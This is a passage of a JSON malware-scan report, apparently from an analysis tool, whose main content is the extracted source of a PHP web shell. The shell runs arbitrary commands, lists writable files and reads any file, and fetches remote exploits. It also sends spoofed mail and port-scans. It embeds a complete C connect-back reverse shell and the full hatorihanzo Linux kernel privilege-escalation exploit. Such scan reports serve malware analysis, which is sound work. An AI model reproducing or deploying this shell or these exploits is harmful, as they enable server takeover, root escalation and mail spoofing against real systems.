            "  while (list($info, $value) = each ($uname)) {",
            "  <TR>",
            "    <TD><DIV STYLE=\"font-family: verdana; font-size: 15px;\"><?= $info ?>: <?= $value ?></DIV></TD>",
            "  </TR>",
            "<?php",
            "  <TR>",
            "   <TR>",
            "    <TD><DIV STYLE=\"font-family: verdana; font-size: 15px;\">Script Current User: <?= $dono ?></DIV></TD>",
            "  </TR>",
            "  <TR>",
            "    <TD><DIV STYLE=\"font-family: verdana; font-size: 15px;\">PHP Version: <?= $ver ?></DIV></TD>",
            "  </TR>",
            "  <TR>",
            "    <TD><DIV STYLE=\"font-family: verdana; font-size: 15px;\">User Info: uid(<?= $login ?>) euid(<?= $euid ?>) gid(<?= $gid ?>)</DIV></TD>",
            "  </TR>",
            "  <TR>",
            "    <TD><DIV STYLE=\"font-family: verdana; font-size: 15px;\">Current Path: <?= $chdir ?></DIV></TD>",
            "  </TR>",
            "  <TR>",
            "    <TD><DIV STYLE=\"font-family: verdana; font-size: 15px;\">Server IP: <?php $aaa =  gethostbyname($SERVER_NAME);  echo $aaa;?></DIV></TD>",
            "  </TR>",
            "   <TR>",
            "    <TD><DIV STYLE=\"font-family: verdana; font-size: 15px;\">Web Server: <?= \"$SERVER_SOFTWARE $SERVER_VERSION\"; ?></DIV></TD>",
            "  </TR>",
            "</TABLE>",
            "<BR>",
            "<?php",
            "  if ($cmd != \"\") {",
            "    echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[*] Command Mode Run</DIV>\";",
            "<DIV STYLE=\"font-family: verdana; font-size: 20px; font-weight: bold; color: #F3A700;\">Command Stdout</DIV>",
            "<?php",
            "if ($fe == 1){",
            "$fe = \"exec\";",
            "if ($fe == \"\"){",
            "$fe = \"passthru\";",
            "if ($fe == \"2\"){",
            "$fe = \"system\";",
            "    if (isset($chdir)) @chdir($chdir);",
            "    ob_start( );",
            "      $fe(\"$cmd  2>&1\");",
            "      $output = ob_get_contents();",
            "    ob_end_clean( );",
            "<TEXTAREA COLS=\"75\" ROWS=\"8\" STYLE=\"font-family: verdana; font-size: 12px;\">",
            "<?php",
            "    if (!empty($output)) echo str_replace(\">\", \"&gt;\", str_replace(\"<\", \"&lt;\", $output));",
            "</TEXTAREA>",
            "<BR>",
            "<?php",
            "  if ($safemode != \"\") {",
            "    echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[*] Safemode Mode Run</DIV>\";",
            "<DIV STYLE=\"font-family: verdana; font-size: 20px; font-weight: bold; color: #F3A700;\">Safe Mode Directory Listing</DIV>",
            "<?php",
            "    if ($dir = @opendir($chdir)) {",
            "      echo \"<TABLE border=1 cellspacing=1 cellpadding=0>\";",
            "      echo \"<TR>\";",
            "      echo \"<TD valign=top>\";",
            "      echo \"<b><font size=2 face=arial>List All Files</b> <br><br>\";",
            "      while (($file = readdir($dir)) !== false) {",
            "        if (@is_file($file)) {",
            "          $file1 = fileowner($file);",
            "          $file2 = fileperms($file);",
            "    \t  echo \"<font color=green>$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>\"; ",
            "\t  // echo \"<font color=green>$file1 - $file2 - $file </font><br>\";",
            "          flush( );",
            "        }",
            "      }",
            "      echo \"</TD>\";",
            "      echo\"<TD valign=top>\";",
            "      echo \"<b><font size=2 face=arial>List Only Folders</b> <br><br>\";",
            "      if ($dir = @opendir($chdir)) {",
            "        while (($file = readdir($dir)) !== false) {",
            "          if (@is_dir($file)) {",
            "            $file1 = fileowner($file);",
            "           $file2 = fileperms($file);",
            "\t    echo \"<font color=blue>$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&chdir=$chdir/$file>$file</a><br>\"; ",
            "            // echo \"<font color=blue>$file1 - $file2 - $file </font><br>\";",
            "          }",
            "        }",
            "      }",
            "      echo \"</TD>\";",
            "      echo\"<TD valign=top>\";",
            "      echo \"<b><font size=2 face=arial>List Writable Folders</b><br><br>\";",
            "      if ($dir = @opendir($chdir)) {",
            "        while (($file = readdir($dir)) !== false) {",
            "          if (@is_writable($file) && @is_dir($file)) {",
            "            $file1 = fileowner($file);",
            "            $file2 = fileperms($file);",
            "            echo \"<font color=red>$file1 - $file2 - $file </font><br>\";",
            "          }",
            "        }",
            "      }",
            "      echo \"</TD>\";",
            "      echo \"</TD>\";",
            "      echo \"<TD valign=top>\";",
            "      echo \"<b><font size=2 face=arial>List Writable Files</b> <br><br>\";",
            "      if ($dir = opendir($chdir)) {",
            "        while (($file = readdir($dir)) !== false) {",
            "          if (@is_writable($file) && @is_file($file)) {",
            "            $file1 = fileowner($file);",
            "            $file2 = fileperms($file);",
            "    \t    echo \"<font color=red>$file1 - $file2 - $file </font><br>\";",
            "          }",
            "        }",
            "      }",
            "      echo \"</TD>\";",
            "      echo \"</TR>\";",
            "      echo \"</TABLE>\";",
            "    }",
            "<?php",
            "  if ($shell == \"write\") {",
            "    $shell = \"#include <stdio.h>\\n\" .",
            "             \"#include <sys/socket.h>\\n\" .",
            "             \"#include <netinet/in.h>\\n\" .",
            "             \"#include <arpa/inet.h>\\n\" .",
            "             \"#include <netdb.h>\\n\" .",
            "             \"int main(int argc, char **argv) {\\n\" .",
            "             \"  char *host;\\n\" .",
            "             \"  int port = 80;\\n\" .",
            "             \"  int f;\\n\" .",
            "             \"  int l;\\n\" .",
            "             \"  int sock;\\n\" .",
            "             \"  struct in_addr ia;\\n\" .",
            "             \"  struct sockaddr_in sin, from;\\n\" .",
            "             \"  struct hostent *he;\\n\" .",
            "             \"  char msg[ ] = \\\"Welcome to Data Cha0s Connect Back Shell\\\\n\\\\n\\\"\\n\" .",
            "             \"                \\\"Issue \\\\\\\"export TERM=xterm; exec bash -i\\\\\\\"\\\\n\\\"\\n\" .",
            "             \"                \\\"For More Reliable Shell.\\\\n\\\"\\n\" .",
            "             \"                \\\"Issue \\\\\\\"unset HISTFILE; unset SAVEHIST\\\\\\\"\\\\n\\\"\\n\" .",
            "             \"                \\\"For Not Getting Logged.\\\\n(;\\\\n\\\\n\\\";\\n\" .",
            "             \"  printf(\\\"Data Cha0s Connect Back Backdoor\\\\n\\\\n\\\");\\n\" .",
            "             \"  if (argc < 2 || argc > 3) {\\n\" .",
            "             \"    printf(\\\"Usage: %s [Host] <port>\\\\n\\\", argv[0]);\\n\" .",
            "             \"    return 1;\\n\" .",
            "             \"  }\\n\" .",
            "             \"  printf(\\\"[*] Dumping Arguments\\\\n\\\");\\n\" .",
            "             \"  l = strlen(argv[1]);\\n\" .",
            "             \"  if (l <= 0) {\\n\" .",
            "             \"    printf(\\\"[-] Invalid Host Name\\\\n\\\");\\n\" .",
            "             \"    return 1;\\n\" .",
            "             \"  }\\n\" .",
            "             \"  if (!(host = (char *) malloc(l))) {\\n\" .",
            "             \"    printf(\\\"[-] Unable to Allocate Memory\\\\n\\\");\\n\" .",
            "             \"    return 1;\\n\" .",
            "             \"  }\\n\" .",
            "             \"  strncpy(host, argv[1], l);\\n\" .",
            "             \"  if (argc == 3) {\\n\" .",
            "             \"    port = atoi(argv[2]);\\n\" .",
            "             \"    if (port <= 0 || port > 65535) {\\n\" .",
            "             \"      printf(\\\"[-] Invalid Port Number\\\\n\\\");\\n\" .",
            "             \"      return 1;\\n\" .",
            "             \"    }\\n\" .",
            "             \"  }\\n\" .",
            "             \"  printf(\\\"[*] Resolving Host Name\\\\n\\\");\\n\" .",
            "             \"  he = gethostbyname(host);\\n\" .",
            "             \"  if (he) {\\n\" .",
            "             \"    memcpy(&ia.s_addr, he->h_addr, 4);\\n\" .",
            "             \"  } else if ((ia.s_addr = inet_addr(host)) == INADDR_ANY) {\\n\" .",
            "             \"    printf(\\\"[-] Unable to Resolve: %s\\\\n\\\", host);\\n\" .",
            "             \"    return 1;\\n\" .",
            "             \"  }\\n\" .",
            "             \"  sin.sin_family = PF_INET;\\n\" .",
            "             \"  sin.sin_addr.s_addr = ia.s_addr;\\n\" .",
            "             \"  sin.sin_port = htons(port);\\n\" .",
            "             \"  printf(\\\"[*] Connecting...\\\\n\\\");\\n\" .",
            "             \"  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\\n\" .",
            "             \"    printf(\\\"[-] Socket Error\\\\n\\\");\\n\" .",
            "             \"    return 1;\\n\" .",
            "             \"  }\\n\" .",
            "             \"  if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != 0) {\\n\" .",
            "             \"    printf(\\\"[-] Unable to Connect\\\\n\\\");\\n\" .",
            "            \"    return 1;\\n\" .",
            "            \"  }\\n\" .",
            "             \"  printf(\\\"[*] Spawning Shell\\\\n\\\");\\n\" .",
            "             \"  f = fork( );\\n\" .",
            "             \"  if (f < 0) {\\n\" .",
            "             \"    printf(\\\"[-] Unable to Fork\\\\n\\\");\\n\" .",
            "             \"    return 1;\\n\" .",
            "            \"  } else if (!f) {\\n\" .",
            "             \"    write(sock, msg, sizeof(msg));\\n\" .",
            "             \"    dup2(sock, 0);\\n\" .",
            "             \"    dup2(sock, 1);\\n\" .",
            "             \"    dup2(sock, 2);\\n\" .",
            "             \"    execl(\\\"/bin/sh\\\", \\\"shell\\\", NULL);\\n\" .",
            "             \"    close(sock);\\n\" .",
            "             \"    return 0;\\n\" .",
            "             \"  }\\n\" .",
            "             \"  printf(\\\"[*] Detached\\\\n\\\\n\\\");\\n\" .",
            "             \"  return 0;\\n\" .",
            "             \"}\\n\";",
            "    $fp = fopen(\"/tmp/dc-connectback.c\", \"w\");",
            "    $ok = fwrite($fp, $shell);",
            "    if (!empty($ok)) {",
            "      echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[*] Connect Back Shell Was Successfuly Copied</DIV>\";",
            "    } else {",
            "      echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[-] An Error Has Ocurred While Copying Shell</DIV>\";",
            "    }",
            "  if ($kernel == \"write\") {",
            "    $kernel = \"/*\\n\" .",
            "              \" * hatorihanzo.c\\n\" .",
            "              \" * Linux kernel do_brk vma overflow exploit.\\n\" .",
            "              \" *\\n\" .",
            "              \" * The bug was found by Paul (IhaQueR) Starzetz <paul@isec.pl>\\n\" .",
            "              \" *\\n\" .",
            "             \" * Further research and exploit development by\\n\" .",
            "              \" * Wojciech Purczynski <cliph@isec.pl> and Paul Starzetz.\\n\" .",
            "              \" *\\n\" .",
            "              \" * (c) 2003 Copyright by IhaQueR and cliph. All Rights Reserved.\\n\" .",
            "              \" *\\n\" .",
            "              \" * COPYING, PRINTING, DISTRIBUTION, MODIFICATION, COMPILATION AND ANY USE\\n\" .",
            "              \" * OF PRESENTED CODE IS STRICTLY PROHIBITED.\\n\" .",
            "              \"*/\\n\" .",
            "              \"#define _GNU_SOURCE\\n\" .",
            "              \"#include <stdio.h>\\n\" .",
            "              \"#include <stdlib.h>\\n\" .",
            "              \"#include <errno.h>\\n\" .",
            "              \"#include <string.h>\\n\" .",
            "              \"#include <unistd.h>\\n\" .",
            "              \"#include <fcntl.h>\\n\" .",
            "              \"#include <signal.h>\\n\" .",
            "              \"#include <paths.h>\\n\" .",
            "             \"#include <grp.h>\\n\" .",
            "             \"#include <setjmp.h>\\n\" .",
            "              \"#include <stdint.h>\\n\" .",
            "              \"#include <sys/mman.h>\\n\" .",
            "              \"#include <sys/ipc.h>\\n\" .",
            "              \"#include <sys/shm.h>\\n\" .",
            "              \"#include <sys/ucontext.h>\\n\" .",
            "              \"#include <sys/wait.h>\\n\" .",
            "              \"#include <asm/ldt.h>\\n\" .",
            "              \"#include <asm/page.h>\\n\" .",
            "              \"#include <asm/segment.h>\\n\" .",
            "             \"#include <linux/unistd.h>\\n\" .",
            "              \"#include <linux/linkage.h>\\n\" .",
            "              \"#define kB   * 1024\\n\" .",
            "              \"#define MB   * 1024 kB\\n\" .",
            "              \"#define GB   * 1024 MB\\n\" .",
            "              \"#define MAGIC             0xdefaced /* I should've patented this number -cliph */\\n\" .",
            "              \"#define ENTRY_MAGIC 0\\n\" .",
            "              \"#define ENTRY_GATE 2\\n\" .",
            "              \"#define ENTRY_CS    4\\n\" .",
            "              \"#define ENTRY_DS    6\\n\" .",
            "              \"#define CS          ((ENTRY_CS << 2) | 4)\\n\" .",
            "              \"#define DS          ((ENTRY_DS << 2) | 4)\\n\" .",
            "              \"#define GATE        ((ENTRY_GATE << 2) | 4 | 3)\\n\" .",
            "              \"#define LDT_PAGES   ((LDT_ENTRIES*LDT_ENTRY_SIZE+PAGE_SIZE-1) / PAGE_SIZE)\\n\" .",
            "              \"#define TOP_ADDR    0xFFFFE000U\\n\" .",
            "              \"/* configuration */\\n\" .",
            "              \"unsigned     task_size;\\n\" .",
            "              \"unsigned     page;\\n\" .",
            "              \"uid_t        uid;\\n\" .",
            "              \"unsigned     address;\\n\" .",
            "              \"int dontexit = 0;\\n\" .",
            "              \"void fatal(char * msg)\\n\" .",
            "              \"{\\n\" .",
            "              \"      fprintf(stderr, \\\"[-] %s: %s\\\\n\\\", msg, strerror(errno));\\n\" .",
            "              \"      if (dontexit) {\\n\" .",
            "              \"             fprintf(stderr, \\\"[-] Unable to exit, entering neverending loop.\\\\n\\\");\\n\" .",
            "              \"             kill(getpid(), SIGSTOP);\\n\" .",
            "              \"             for (;;) pause();\\n\" .",
            "              \"      }\\n\" .",
            "              \"      exit(EXIT_FAILURE);\\n\" .",
            "              \"}\\n\" .",
            "              \"void configure(void)\\n\" .",
            "              \"{\\n\" .",
            "              \"      unsigned val;\\n\" .",
            "              \"      task_size = ((unsigned)&val + 1 GB ) / (1 GB) * 1 GB;\\n\" .",
            "              \"      uid = getuid();\\n\" .",
            "              \"}\\n\" .",
            "              \"void expand(void)\\n\" .",
            "              \"{\\n\" .",
            "              \"      unsigned top = (unsigned) sbrk(0);\\n\" .",
            "              \"      unsigned limit = address + PAGE_SIZE;\\n\" .",
            "              \"      do {\\n\" .",
            "              \"             if (sbrk(PAGE_SIZE) == NULL)\\n\" .",
            "              \"                   fatal(\\\"Kernel seems not to be vulnerable\\\");\\n\" .",
            "              \"             dontexit = 1;\\n\" .",
            "              \"             top += PAGE_SIZE;\\n\" .",
            "              \"      } while (top < limit);\\n\" .",
            "              \"}\\n\" .",
            "             \"jmp_buf jmp;\\n\" .",
            "              \"#define MAP_NOPAGE 1\\n\" .",
            "              \"#define MAP_ISPAGE 2\\n\" .",
            "             \"void sigsegv(int signo, siginfo_t * si, void * ptr)\\n\" .",
            "              \"{\\n\" .",
            "              \"      struct ucontext * uc = (struct ucontext *) ptr;\\n\" .",
            "              \"      int error_code = uc->uc_mcontext.gregs[REG_ERR];\\n\" .",
            "              \"      (void)signo;\\n\" .",
            "              \"      (void)si;\\n\" .",
            "              \"      error_code = MAP_NOPAGE + (error_code & 1);\\n\" .",
            "              \"      longjmp(jmp, error_code);\\n\" .",
            "              \"}\\n\" .",
            "              \"void prepare(void)\\n\" .",
            "              \"{\\n\" .",
            "              \"      struct sigaction sa;\\n\" .",
            "              \"      sa.sa_sigaction = sigsegv;\\n\" .",
            "              \"      sa.sa_flags = SA_SIGINFO | SA_NOMASK;\\n\" .",
            "              \"      sigemptyset(&sa.sa_mask);\\n\" .",
            "              \"      sigaction(SIGSEGV, &sa, NULL);\\n\" .",
            "              \"}\\n\" .",
            "              \"int testaddr(unsigned addr)\\n\" .",
            "              \"{\\n\" .",
            "              \"      int val;\\n\" .",
            "              \"      val = setjmp(jmp);\\n\" .",
            "              \"      if (val == 0) {\\n\" .",
            "              \"             asm (\\\"verr (%%eax)\\\" : : \\\"a\\\" (addr));\\n\" .",
            "              \"             return MAP_ISPAGE;\\n\" .",
            "              \"      }\\n\" .",
            "              \"      return val;\\n\" .",
            "              \"}\\n\" .",
            "              \"#define map_pages (((TOP_ADDR - task_size) + PAGE_SIZE - 1) / PAGE_SIZE)\\n\" .",
            "             \"#define map_size (map_pages + 8*sizeof(unsigned) - 1) / (8*sizeof(unsigned))\\n\" .",
            "              \"#define next(u, b) do { if ((b = 2*b) == 0) { b = 1; u++; } } while(0)\\n\" .",
            "              \"void map(unsigned * map)\\n\" .",
            "              \"{\\n\" .",
            "              \"      unsigned addr = task_size;\\n\" .",
            "              \"      unsigned bit = 1;\\n\" .",
            "              \"      prepare();\\n\" .",
            "              \"      while (addr < TOP_ADDR) {\\n\" .",
            "              \"             if (testaddr(addr) == MAP_ISPAGE)\\n\" .",
            "              \"                   *map |= bit;\\n\" .",
            "              \"             addr += PAGE_SIZE;\\n\" .",
            "              \"             next(map, bit);\\n\" .",
            "              \"      }\\n\" .",
            "              \"      signal(SIGSEGV, SIG_DFL);\\n\" .",
            "              \"}\\n\" .",
            "              \"void find(unsigned * m)\\n\" .",
            "              \"{\\n\" .",
            "              \"      unsigned addr = task_size;\\n\" .",
            "              \"      unsigned bit = 1;\\n\" .",
            "             \"      unsigned count;\\n\" .",
            "             \"      unsigned tmp;\\n\" .",
            "              \"      prepare();\\n\" .",
            "              \"      tmp = address = count = 0U;\\n\" .",
            "              \"      while (addr < TOP_ADDR) {\\n\" .",
            "              \"             int val = testaddr(addr);\\n\" .",
            "              \"             if (val == MAP_ISPAGE && (*m & bit) == 0) {\\n\" .",
            "              \"                   if (!tmp) tmp = addr;\\n\" .",
            "              \"                   count++;\\n\" .",
            "              \"             } else {\\n\" .",
            "              \"                   if (tmp && count == LDT_PAGES) {\\n\" .",
            "              \"                          errno = EAGAIN;\\n\" .",
            "              \"                          if (address)\\n\" .",
            "              \"                                fatal(\\\"double allocation\\\\n\\\");\\n\" .",
            "              \"                          address = tmp;\\n\" .",
            "              \"                   }\\n\" .",
            "              \"                   tmp = count = 0U;\\n\" .",
            "              \"             }\\n\" .",
            "              \"             addr += PAGE_SIZE;\\n\" .",
            "              \"             next(m, bit);\\n\" .",
            "              \"      }\\n\" .",
            "              \"      signal(SIGSEGV, SIG_DFL);\\n\" .",
            "              \"      if (address)\\n\" .",
            "              \"             return;\\n\" .",
            "              \"      errno = ENOTSUP;\\n\" .",
            "              \"      fatal(\\\"Unable to determine kernel address\\\");\\n\" .",
            "              \"}\\n\" .",
            "              \"int modify_ldt(int, void *, unsigned);\\n\" .",
            "              \"void ldt(unsigned * m)\\n\" .",
            "              \"{\\n\" .",
            "              \"      struct modify_ldt_ldt_s l;\\n\" .",
            "              \"      map(m);\\n\" .",
            "              \"      memset(&l, 0, sizeof(l));\\n\" .",
            "              \"      l.entry_number = LDT_ENTRIES - 1;\\n\" .",
            "              \"      l.seg_32bit = 1;\\n\" .",
            "              \"      l.base_addr = MAGIC >> 16;\\n\" .",
            "              \"      l.limit = MAGIC & 0xffff;\\n\" .",
            "              \"      if (modify_ldt(1, &l, sizeof(l)) == -1)\\n\" .",
            "              \"             fatal(\\\"Unable to set up LDT\\\");\\n\" .",
            "              \"      l.entry_number = ENTRY_MAGIC / 2;\\n\" .",
            "              \"      if (modify_ldt(1, &l, sizeof(l)) == -1)\\n\" .",
            "              \"             fatal(\\\"Unable to set up LDT\\\");\\n\" .",
            "              \"      find(m);\\n\" .",
            "              \"}\\n\" .",
            "              \"asmlinkage void kernel(unsigned * task)\\n\" .",
            "              \"{\\n\" .",
            "              \"      unsigned * addr = task;\\n\" .",
            "              \"      /* looking for uids */\\n\" .",
            "              \"      while (addr[0] != uid || addr[1] != uid ||\\n\" .",
            "              \"             addr[2] != uid || addr[3] != uid)\\n\" .",
            "              \"             addr++;\\n\" .",
            "              \"      addr[0] = addr[1] = addr[2] = addr[3] = 0;    /* uids */\\n\" .",
            "              \"      addr[4] = addr[5] = addr[6] = addr[7] = 0;    /* uids */\\n\" .",
            "              \"      addr[8] = 0;\\n\" .",
            "              \"      /* looking for vma */\\n\" .",
            "              \"      for (addr = (unsigned *) task_size; addr; addr++) {\\n\" .",
            "              \"             if (addr[0] >= task_size && addr[1] < task_size &&\\n\" .",
            "              \"                 addr[2] == address && addr[3] >= task_size) {\\n\" .",
            "              \"                   addr[2] = task_size - PAGE_SIZE;\\n\" .",
            "              \"                   addr = (unsigned *) addr[3];\\n\" .",
            "              \"                   addr[1] = task_size - PAGE_SIZE;\\n\" .",
            "              \"                   addr[2] = task_size;\\n\" .",
            "              \"                   break;\\n\" .",
            "              \"             }\\n\" .",
            "              \"      }\\n\" .",
            "              \"}\\n\" .",
            "              \"void kcode(void);\\n\" .",
            "              \"#define __str(s) #s\\n\" .",
            "              \"#define str(s) __str(s)\\n\" .",
            "              \"void __kcode(void)\\n\" .",
            "              \"{\\n\" .",
            "              \"      asm(\\n\" .",
            "              \"             \\\"kcode:                                \\\\n\\\"\\n\" .",
            "              \"             \\\"     pusha                            \\\\n\\\"\\n\" .",
            "              \"             \\\"     pushl %es                        \\\\n\\\"\\n\" .",
            "              \"             \\\"     pushl %ds                        \\\\n\\\"\\n\" .",
            "              \"             \\\"     movl   $(\\\" str(DS) \\\") ,%edx      \\\\n\\\"\\n\" .",
            "              \"             \\\"     movl   %edx,%es                  \\\\n\\\"\\n\" .",
            "              \"             \\\"     movl   %edx,%ds                  \\\\n\\\"\\n\" .",
            "              \"             \\\"     movl   $0xffffe000,%eax          \\\\n\\\"\\n\" .",
            "              \"             \\\"     andl   %esp,%eax                 \\\\n\\\"\\n\" .",
            "              \"             \\\"     pushl %eax                       \\\\n\\\"\\n\" .",
            "              \"             \\\"     call   kernel                    \\\\n\\\"\\n\" .",
            "              \"             \\\"     addl   $4, %esp                  \\\\n\\\"\\n\" .",
            "              \"             \\\"     popl   %ds                       \\\\n\\\"\\n\" .",
            "              \"             \\\"     popl   %es                       \\\\n\\\"\\n\" .",
            "              \"             \\\"     popa                             \\\\n\\\"\\n\" .",
            "              \"             \\\"     lret                             \\\\n\\\"\\n\" .",
            "              \"      );\\n\" .",
            "              \"}\\n\" .",
            "              \"void knockout(void)\\n\" .",
            "              \"{\\n\" .",
            "              \"      unsigned * addr = (unsigned *) address;\\n\" .",
            "              \"      if (mprotect(addr, PAGE_SIZE, PROT_READ|PROT_WRITE) == -1)\\n\" .",
            "              \"             fatal(\\\"Unable to change page protection\\\");\\n\" .",
            "              \"      errno = ESRCH;\\n\" .",
            "              \"      if (addr[ENTRY_MAGIC] != MAGIC)\\n\" .",
            "              \"             fatal(\\\"Invalid LDT entry\\\");\\n\" .",
            "              \"      /* setting call gate and privileged descriptors */\\n\" .",
            "              \"      addr[ENTRY_GATE+0] = ((unsigned)CS << 16) | ((unsigned)kcode & 0xffffU);\\n\" .",
            "              \"      addr[ENTRY_GATE+1] = ((unsigned)kcode & ~0xffffU) | 0xec00U;\\n\" .",
            "              \"      addr[ENTRY_CS+0] = 0x0000ffffU; /* kernel 4GB code at 0x00000000 */\\n\" .",
            "              \"      addr[ENTRY_CS+1] = 0x00cf9a00U;\\n\" .",
            "              \"      addr[ENTRY_DS+0] = 0x0000ffffU; /* user   4GB code at 0x00000000 */\\n\" .",
            "              \"      addr[ENTRY_DS+1] = 0x00cf9200U;\\n\" .",
            "              \"      prepare();\\n\" .",
            "              \"      if (setjmp(jmp) != 0) {\\n\" .",
            "              \"             errno = ENOEXEC;\\n\" .",
            "              \"             fatal(\\\"Unable to jump to call gate\\\");\\n\" .",
            "              \"      }\\n\" .",
            "              \"      asm(\\\"lcall $\\\" str(GATE) \\\",$0x0\\\");      /* this is it */\\n\" .",
            "              \"}\\n\" .",
            "              \"void shell(void)\\n\" .",
            "              \"{\\n\" .",
            "              \"      char * argv[] = { _PATH_BSHELL, NULL };\\n\" .",
            "              \"      execve(_PATH_BSHELL, argv, environ);\\n\" .",
            "             \"      fatal(\\\"Unable to spawn shell\\\\n\\\");\\n\" .",
            "             \"}\\n\" .",
            "              \"void remap(void)\\n\" .",
            "              \"{\\n\" .",
            "              \"      static char stack[8 MB];  /* new stack */\\n\" .",
            "              \"      static char * envp[] = { \\\"PATH=\\\" _PATH_STDPATH, NULL };\\n\" .",
            "              \"      static unsigned * m;\\n\" .",
            "              \"      static unsigned b;\\n\" .",
            "              \"      m = (unsigned *) sbrk(map_size);\\n\" .",
            "             \"      if (!m)\\n\" .",
            "             \"             fatal(\\\"Unable to allocate memory\\\");\\n\" .",
            "              \"      environ = envp;\\n\" .",
            "              \"      asm (\\\"movl %0, %%esp\\\\n\\\" : : \\\"a\\\" (stack + sizeof(stack)));\\n\" .",
            "              \"      b = ((unsigned)sbrk(0) + PAGE_SIZE - 1) & PAGE_MASK;\\n\" .",
            "              \"      if (munmap((void*)b, task_size - b) == -1)\\n\" .",
            "              \"             fatal(\\\"Unable to unmap stack\\\");\\n\" .",
            "              \"      while (b < task_size) {\\n\" .",
            "              \"             if (sbrk(PAGE_SIZE) == NULL)\\n\" .",
            "              \"                   fatal(\\\"Unable to expand BSS\\\");\\n\" .",
            "              \"             b += PAGE_SIZE;\\n\" .",
            "              \"      }\\n\" .",
            "              \"      ldt(m);\\n\" .",
            "              \"      expand();\\n\" .",
            "              \"      knockout();\\n\" .",
            "              \"      shell();\\n\" .",
            "              \"}\\n\" .",
            "              \"int main(void)\\n\" .",
            "              \"{\\n\" .",
            "              \"      configure();\\n\" .",
            "              \"      remap();\\n\" .",
            "              \"      return EXIT_FAILURE;\\n\" .",
            "              \"}\\n\";",
            "    $fp = fopen(\"/tmp/xpl_brk.c\", \"w\");",
            "    $ok = fwrite($fp, $kernel);",
            "    ",
            "    if (!empty($ok)) {",
            "      echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[*] Linux Local Kernel Exploit Was Successfuly Copied</DIV>\";",
            "    } else {",
            "      echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[-] An Error Has Ocurred While Copying Kernel Exploit</DIV>\";",
            "   }",
            "</CENTER>",
            "<pre><font face=\"Tahoma\" size=\"2\">",
            "<?php",
            "// Function to Visualize Source Code files ",
            "if ($see != \"\") {",
            "  $fp = fopen($see, \"r\"); ",
            "  $read = fread($fp, 30000); ",
            "  echo \"============== $see ================<br>\";",
            "  echo \"<textarea name=textarea cols=80 rows=15>\"; ",
            "  echo \"$read\"; ",
            "  Echo \"</textarea>\"; ",
            "// Function to Dowload Local Xploite Binary COde or Source Code",
            "if ($dx != \"\") {",
            "  $fp = @fopen(\"$hostxpl\",r);",
            "  $fp2 = @fopen(\"$storage\",\"w\");",
            "  fwrite($fp2, \"\");",
            "  $fp1 = @fopen(\"$storage\",\"a+\");",
            "  for (;;) {",
            "    $read = @fread($fp, 4096);",
            "    if (empty($read)) break;",
            "    $ok = fwrite($fp1, $read);",
            "    ",
            "    if (empty($ok)) {",
            "      echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[-] An Error Has Ocurred While Uploading File</DIV>\";",
            "      break;",
            "    }",
            "  if (!empty($ok)) {",
            "    echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[*] File Was Successfuly Uploaded</DIV>\";",
            "flush( );",
            "// Function to visulize Format Color Source Code PHP",
            "if ($sfc != \"\") {",
            "  $showcode = show_source(\"$sfc\");",
            "  echo \"<font size=4> $showcode </font>\";",
            "// Function to Visualize all infomation files",
            "if ($fileinfo != \"\") {",
            "  $infofile = stat(\"$fileanalize\");",
            "  while (list($info, $value) = each ($infofile)) {",
            "    echo\" Info: $info  Value: $value <br>\";",
            "// Function to send fake mail",
            "if ($fake == 1) {",
            "  echo \"<FORM METHOD=POST ACTION=\\\"$SCRIPT_NAME?$QUERY_STRING&send=1\\\">\";",
            "  echo \"Your Fake Mail <INPUT TYPE=\\\"\\\" NAME=\\\"yourmail\\\"><br>\";",
            "  echo \"Your Cavy:<INPUT TYPE=\\\"\\\" NAME=\\\"cavy\\\"><br>\";",
            "  echo \"Suject: <INPUT TYPE=\\\"text\\\" NAME=\\\"subject\\\"><br>\";",
            "  echo \"Text: <TEXTAREA NAME=\\\"body\\\" ROWS=\\\"\\\" COLS=\\\"\\\"></TEXTAREA><br>\";",
            "  echo \"<INPUT TYPE=\\\"hidden\\\" NAME=\\\"send\\\" VALUE=\\\"1\\\"><br>\";",
            "  echo \"<INPUT TYPE=\\\"submit\\\" VALUE=\\\"Send Fake Mail\\\">\";",
            "  echo \"</FORM>\";",
            "if($send == 1) {",
            "  if (mail($cavy, $subject, $body, \"From: $yourmail\\r\\n\")) {",
            "    echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[*] Mail Send Sucessfuly</DIV>\";",
            "  } else {",
            "    echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[-] An Error Has Ocurred While Sending Mail</DIV>\";",
            "if ($portscan != \"\") {",
            "  $port = array (\"21\",\"22\",\"23\",\"25\",\"110\",);",
            "  $values = count($port);",
            "  for ($cont=0; $cont < $values; $cont++) {",
            "    @$sock[$cont] = Fsockopen($SERVER_NAME, $port[$cont], $oi, $oi2, 1);",
            "    $service = Getservbyport($port[$cont],\"tcp\");",
            "    @$get = fgets($sock[$cont]);",
            "    echo \"<br>Port: $port[$cont] - Service: $service<br><br>\";",
            "    echo \"<br>Banner: $get <br><br>\";",
            "    flush();",
            "</font></pre> "
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.428668",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
